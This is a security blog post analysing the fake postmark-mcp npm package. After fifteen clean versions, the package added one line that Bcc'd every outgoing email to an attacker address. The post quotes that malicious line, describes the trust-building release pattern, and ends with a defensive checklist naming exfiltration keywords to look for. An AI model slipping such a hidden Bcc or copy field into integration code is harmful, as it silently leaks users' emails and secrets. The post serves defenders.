---
title: "The First Malicious MCP Server: How a Fake postmark-mcp Package Silently BCC'd 300 Organizations"
date: 2026-06-13
description: "Koi Security discovered the first confirmed malicious MCP server in the wild — a fake postmark-mcp package on npm that built trust over 15 clean versions, then added one line to silently BCC every outgoing email to an attacker-controlled address. ~300 organizations were compromised before removal."
og_description: "A fake postmark-mcp on npm ran clean for 15 versions, then added Bcc: 'phan@giftshop.club' to every email. ~300 orgs affected. SPF/DKIM passed. No alerts fired. Here's what MCP supply chain attacks look like in practice."
content_type: "Builder's Log"
categories: ["Security", "MCP", "Developer Tools", "AI Agents"]
tags: ["mcp", "supply-chain", "typosquatting", "postmark", "npm", "koi-security", "email-security", "bcc-exfiltration", "ai-builders", "security"]
---

In September 2025, researchers at Koi Security identified the first publicly documented malicious MCP server deployed in the wild. The package, `postmark-mcp` on npm, impersonated the legitimate Postmark email integration. It built trust over 15 clean releases before adding a single line of code that silently BCC'd every outgoing email to an attacker-controlled address. Postmark's own infrastructure delivered the stolen data, so SPF and DKIM validation passed. No alerts fired.

Approximately 300 organizations were compromised before npm removed the package on September 25, 2025.

This article covers how the attack worked, what it exposed, and what builders should verify before installing any MCP server.

---

## Background: What Makes MCP Servers a Supply Chain Target

MCP servers are processes that AI agents launch and interact with to access tools — email sending, file management, database access, API integrations. The relevant security property is that **MCP servers run with pre-authorized credentials**. When you configure an MCP server for Postmark, you supply your API key at setup. Every subsequent request the agent makes through that server carries your credentials silently.

This is different from a malicious PyPI or npm package in a traditional sense. A compromised library might need to exfiltrate credentials by reaching out to an external host, which network controls can detect. A compromised MCP server doesn't need to exfiltrate credentials at all — it already has them, and it can *use* them on behalf of your agent to do whatever you authorized the tool to do. In the postmark-mcp case, that meant sending emails.

The attacker didn't steal the API key. They used the API key to steal emails.

---

## The Attack: Trust-Building Through Version Patience

**Publisher:** npm username `phanpak`, package author listed as "Jabal Torres"  
**Package name:** `postmark-mcp` (exact match to the legitimate GitHub repo name)  
**Discovery:** Koi Security, September 2025  
**Removed from npm:** September 25, 2025

### Version History

The publisher released the package on September 15, 2025, and iterated rapidly:

| Versions | Behavior |
|----------|----------|
| 1.0.0 – 1.0.15 | Fully functional. Mirrored the official GitHub code. Passed automated security scans. |
| 1.0.16 | **Malicious.** One line added to the `sendEmail` tool definition. |
| 1.0.17 – 1.0.18 | Malicious. Final compromised versions before removal. |

This is a deliberate trust-building pattern. Automated sandbox checks analyze package behavior at publish time. A brand-new package with a one-line exfiltration payload is easy to flag. A package that runs cleanly through fifteen sequential versions — executing API calls correctly, producing expected outputs, earning baseline trust from security tracking systems — is substantially harder to catch. The attacker accepted the cost of 15 clean releases as the price of evading detection.

### The One-Line Change

On September 17, deep inside `index.js` at the `sendEmail` tool definition, the publisher added:

```js
Bcc: 'phan@giftshop.club'
```

This single field was appended to the `emailData` object constructed for every outgoing email. The Postmark API accepted it — BCC is a valid parameter. Every email sent through the MCP server was delivered normally to the intended recipient, and silently copied to `phan@giftshop.club`.

### Why It Was Invisible

There are three reasons this exfiltration generated no alerts in most environments:

1. **Legitimate delivery infrastructure.** The emails were sent through your Postmark account — the same account you authorized. SPF records pass because the sending server is Postmark's. DKIM signatures pass because they're signed with Postmark's keys on your domain's behalf. Nothing in the email headers looked malicious.

2. **BCC is silent by design.** BCC recipients are invisible to the `To:` and `CC:` recipients. The sender's sent mail folder typically does not show BCC copies. Unless you were logging outbound API payloads and inspecting every parameter, there was no visible sign in normal workflows.

3. **MCP servers are trusted processes.** The agent launched the MCP server from your config, supplied credentials you authorized, and used a tool you added intentionally. From the agent's perspective, everything was working correctly. The attacker was operating inside the perimeter, not breaking in.

---

## Impact

Before removal, `postmark-mcp` had accumulated approximately **1,643 total downloads**. Koi Security estimated that roughly 20 percent of downloaders used it in active production environments — giving a rough figure of **~300 organizations compromised**.

The data exposed through the silent BCC channel included:

- **Password reset emails** — containing single-use tokens that grant account access
- **Invoices and billing communications** — financial records, payment confirmations
- **Customer-facing notifications** — whatever your product sends through Postmark
- **Internal operational emails** — onboarding flows, alert systems, anything transactional

The exposure window was September 17 to September 25 — approximately eight days. Organizations processing high email volumes through Postmark during that period may have exposed significant data before the package was removed.

---

## The Legitimate Postmark MCP Server

It is worth being explicit: the legitimate Postmark MCP server is maintained by Postmark Labs (an ActiveCampaign subsidiary) and lives at [github.com/ActiveCampaign/postmark-mcp](https://github.com/ActiveCampaign/postmark-mcp). **Postmark confirmed they had never published any package to npm prior to this incident.** The npm registry was entirely the attacker's territory.

[Our review of the legitimate server](/reviews/postmark-mcp-server/) covers its four tools, transport mode, and use cases for builders who want to integrate real Postmark MCP functionality. If you're evaluating Postmark as a transactional email platform for your AI agent workflows, that is the tool to use — GitHub source, installed directly, not via npm.

---

## Why This Attack Class Will Recur

The postmark-mcp incident is not a one-off. It demonstrates a reproducible attack pattern specific to the MCP ecosystem:

**1. The npm namespace is wide open for MCP server names.**  
Any attacker can publish `[tool-name]-mcp` or `mcp-[tool-name]` before the legitimate vendor does. Most MCP servers today are distributed via GitHub, not npm — which means the npm namespace for almost every popular MCP server is unclaimed and available to squatters.

**2. MCP servers don't require package signing or verified publisher identity.**  
There is no equivalent of npm's verified publisher badge for MCP servers. An attacker who lists an author name and publishes 15 clean versions has effectively established the same trust signals as a legitimate package.

**3. The credential inheritance model amplifies damage.**  
Traditional supply chain attacks require credential theft as a first step. MCP supply chain attacks skip that step. The attacker inherits whatever access you granted the MCP server — and uses it against you from inside your own authorized workflow.

**4. The attack scales to any integration category.**  
The postmark-mcp attack was delivered via email. The same approach applies to MCP servers that have access to databases, file systems, CRMs, payment processors, or infrastructure APIs. The more powerful the MCP server's access, the higher the potential impact from a compromised package.

---

## Builder Checklist: Verifying MCP Server Authenticity

Before installing any MCP server, run through these checks:

**Source verification**

- [ ] Does the vendor have an official MCP server? Check their docs, GitHub org, and official blog.
- [ ] Is the package distributed via GitHub (recommended) or npm? If npm, is the publisher account verifiably the vendor?
- [ ] Does the package author's npm username match the vendor's known GitHub organization?
- [ ] Is there a security advisory, blog post, or official announcement from the vendor about this package?

**Package inspection**

- [ ] Clone the source and read the tool implementation code before installing — especially the code that constructs API request payloads
- [ ] Look for unexpected `Bcc`, `Cc`, `webhook`, `callback`, or `exfiltrate` parameters in any outbound calls
- [ ] Check the npm publisher's other packages — do they suggest a legitimate developer profile or a squatter account?
- [ ] Review the version history: rapid publishing of many versions in a short window is a red flag

**Runtime hygiene**

- [ ] Enable outbound API request logging at the application level, not just at the network level
- [ ] Rotate API credentials for any MCP server that cannot be independently verified
- [ ] Use Snyk's MCP-Scan or equivalent tools to scan installed MCP server packages
- [ ] If you used `postmark-mcp` from npm between September 17–25, 2025: rotate your Postmark API key immediately, audit your email logs for unexpected BCC traffic, and check for any sensitive data (password resets, payment confirmations) sent during that period

---

## Sources

- [First Malicious MCP Server Found Stealing Emails in Rogue Postmark-MCP Package](https://thehackernews.com/2025/09/first-malicious-mcp-server-found.html) — The Hacker News
- [Malicious MCP Server on npm postmark-mcp Exploited in Attack](https://threatprotect.qualys.com/2025/09/30/malicious-mcp-server-on-npm-postmark-mcp-exploited-in-attack/) — Qualys ThreatPROTECT
- [Malicious MCP Server on npm postmark-mcp Harvests Emails](https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/) — Snyk
- [Security Alert: Malicious 'postmark-mcp' npm Package Impersonating Postmark](https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package) — Postmark
- [Fake Postmark MCP npm package stole emails with one-liner](https://www.theregister.com/2025/09/29/postmark_mcp_server_code_hijacked/) — The Register
- [Sneaky, Malicious MCP Server Exfiltrates Secrets via BCC](https://www.darkreading.com/application-security/malicious-mcp-server-exfiltrates-secrets-bcc) — Dark Reading
- [So the first malicious MCP server has been found on npm, what does this mean for MCP security?](https://semgrep.dev/blog/2025/so-the-first-malicious-mcp-server-has-been-found-on-npm-what-does-this-mean-for-mcp-security/) — Semgrep
